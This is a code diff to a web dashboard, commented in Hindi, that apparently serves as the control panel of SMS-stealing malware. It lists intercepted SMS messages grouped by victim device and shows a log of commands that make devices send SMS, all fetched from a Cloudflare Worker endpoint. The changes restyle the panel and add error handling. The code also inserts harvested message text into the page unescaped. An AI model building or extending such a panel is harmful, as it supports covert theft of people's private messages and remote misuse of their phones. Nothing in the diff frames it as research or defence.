@@ -94,6 +94,18 @@
     .contact-item:nth-child(3) { background: linear-gradient(45deg, #7F00FF, #E100FF); }
     .contact-item:nth-child(4) { background: linear-gradient(45deg, #11998e, #38ef7d); }
     .contact-item i { font-size:2rem; display:block; margin-bottom:8px; }
+
+    /* SMS और Command Log के लिए स्टाइल */
+    .sms-item, .cmd-item {
+      background: #f0f0f0;
+      padding: 12px;
+      border-radius: 30px;
+      margin-bottom: 8px;
+      border-left: 6px solid #ff69b4;
+    }
+    .cmd-sent { background: #d4edda; border-left-color: #28a745; }
+    .cmd-failed { background: #f8d7da; border-left-color: #dc3545; }
+    .cmd-pending { background: #fff3cd; border-left-color: #ffc107; }
   </style>
 </head>
 <body>
@@ -133,7 +145,7 @@
 <script>
   (function() {
     // ---------- ⚠️ अपना Worker URL यहाँ डालो ----------
-    const API_BASE = 'https://nameless-glade-22f4.vikash6759ub.workers.dev';  // ⚠️ अपना असल Worker URL डालो
+    const API_BASE = 'https://long-band-8025.vikash6759ub.workers.dev';  // तुम्हारा नया Worker URL
 
     // ---------- ग्लोबल वेरिएबल ----------
     let devices = [];
@@ -245,7 +257,7 @@
       }
     });
 
-    // ---------- View all SMS ----------
+    // ---------- View all SMS (अब डिवाइस जानकारी के साथ) ----------
     document.getElementById('view-all-sms').addEventListener('click', async function() {
       document.getElementById('dropdown-grid').classList.add('hidden');
       try {
@@ -256,7 +268,12 @@
         else {
           const colors = ['#ffe0e0', '#e0ffe0', '#e0e0ff', '#fff0e0', '#f0e0ff'];
           allSms.forEach((sms, idx) => {
-            html += '<div style="background:' + colors[idx % 5] + '; padding:12px; border-radius:30px; margin-bottom:8px;"><strong>Device ' + sms.deviceId + ' (' + (sms.brand || '') + ' ' + (sms.model || '') + ')</strong><br>📞 ' + sms.number + '<br>💬 ' + sms.text + '<br><small>🕒 ' + new Date(sms.time).toLocaleString() + '</small></div>';
+            html += '<div class="sms-item" style="background:' + colors[idx % 5] + ';">' +
+              '<strong>Device ' + sms.deviceId + '</strong> <span style="float:right;">(' + (sms.brand || '') + ' ' + (sms.model || '') + ')</span><br>' +
+              '📞 ' + sms.number + '<br>' +
+              '💬 ' + sms.text + '<br>' +
+              '<small>🕒 ' + new Date(sms.time).toLocaleString() + '</small>' +
+              '</div>';
           });
         }
         html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
@@ -264,25 +281,42 @@
       } catch (e) { showDialog('Error loading SMS: ' + e.message, 'error'); }
     });
 
-    // ---------- View Command SMS ----------
+    // ---------- View Command SMS (अब पूरी तरह सही) ----------
     document.getElementById('view-command-sms').addEventListener('click', async function() {
       document.getElementById('dropdown-grid').classList.add('hidden');
       try {
         const res = await fetch(API_BASE + '/api/command-sms');
+        if (!res.ok) throw new Error('HTTP error ' + res.status);
         const commands = await res.json();
+        
         let html = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-history"></i> Command SMS Log</h3></div><div style="background:white; border-radius:30px; padding:16px; border:2px solid black; max-height:70vh; overflow-y:auto;">';
-        if (commands.length === 0) html += '<p style="text-align:center;">No commands found</p>';
-        else commands.forEach(cmd => {
-          let data = { number: 'N/A', text: 'N/A' };
-          try { data = JSON.parse(cmd.data); } catch (e) {}
-          const statusColor = cmd.status === 'sent' ? '#d4edda' : (cmd.status === 'failed' ? '#f8d7da' : '#fff3cd');
-          const time = new Date(cmd.created_at).toLocaleString();
-          html += '<div style="background:' + statusColor + '; border-left:6px solid ' + (cmd.status === 'sent' ? '#28a745' : (cmd.status === 'failed' ? '#dc3545' : '#ffc107')) + '; border-radius:20px; padding:15px; margin-bottom:12px;">' +
-            '<div style="display:flex; justify-content:space-between;"><strong>📱 ' + data.number + '</strong><span>' + cmd.status.toUpperCase() + '</span></div>' +
-            '<div>💬 ' + data.text + '</div>' +
-            '<div style="display:flex; justify-content:space-between; font-size:0.8rem;"><span>🕒 ' + time + '</span><span>📟 ' + (cmd.brand || '') + ' ' + (cmd.model || '') + '</span></div>' +
-            (cmd.executed_at ? '<div><small>✅ ' + new Date(cmd.executed_at).toLocaleString() + '</small></div>' : '') + '</div>';
-        });
+        
+        if (commands.length === 0) {
+          html += '<p style="text-align:center;">No commands found</p>';
+        } else {
+          commands.forEach(cmd => {
+            let data = { number: 'N/A', text: 'N/A' };
+            try { data = JSON.parse(cmd.data); } catch (e) {}
+            
+            let statusClass = 'cmd-pending';
+            if (cmd.status === 'sent') statusClass = 'cmd-sent';
+            if (cmd.status === 'failed') statusClass = 'cmd-failed';
+            
+            const time = new Date(cmd.created_at).toLocaleString();
+            const execTime = cmd.executed_at ? new Date(cmd.executed_at).toLocaleString() : '—';
+            
+            html += '<div class="' + statusClass + '" style="padding:15px; margin-bottom:12px; border-radius:20px;">' +
+              '<div style="display:flex; justify-content:space-between;"><strong>📱 ' + data.number + '</strong><span>' + cmd.status.toUpperCase() + '</span></div>' +
+              '<div>💬 ' + data.text + '</div>' +
+              '<div style="display:flex; justify-content:space-between; font-size:0.8rem; margin-top:8px;">' +
+                '<span>🕒 ' + time + '</span>' +
+                '<span>📟 ' + (cmd.brand || '') + ' ' + (cmd.model || '') + '</span>' +
+              '</div>' +
+              (cmd.executed_at ? '<div style="font-size:0.7rem; margin-top:4px;">✅ Executed: ' + execTime + '</div>' : '') +
+            '</div>';
+          });
+        }
+        
         html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
         document.getElementById('fullscreen-container').innerHTML = html;
       } catch (e) { showDialog('Error loading commands: ' + e.message, 'error'); }
